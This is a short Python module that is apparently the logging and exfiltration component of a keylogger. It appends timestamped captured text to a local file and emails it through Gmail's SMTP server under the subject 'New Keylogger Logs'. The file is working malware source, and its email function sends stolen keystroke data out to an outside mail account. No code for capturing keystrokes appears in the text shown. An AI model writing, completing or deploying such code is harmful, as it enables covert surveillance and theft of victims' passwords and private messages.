import smtplib, time


def save_text_locally(text, file_path, log=True):
    try:
        file = open(file_path, "a")
    except:
        file = open(file_path, "w")

    file.write("")

    if log:
        file.write("\n" + "-"*10 + "{0} {1}".format(time.strftime("%d/%m/%Y"), time.strftime("%I:%M:%S")) + "-"*10 + "\n")

    file.write(text)
    file.close()


def send_gmail(text, email, password):
    email_content = "Subject: {}\n\n{}".format(f"New Keylogger Logs", text)

    try:
        smtp_server = smtplib.SMTP_SSL("smtp.gmail.com", 465)
        smtp_server.ehlo()  # identifies you to the smtp server
        smtp_server.login(email, password)
        smtp_server.sendmail(email, email, email_content)
        smtp_server.close()
        return True
    except:
        return False
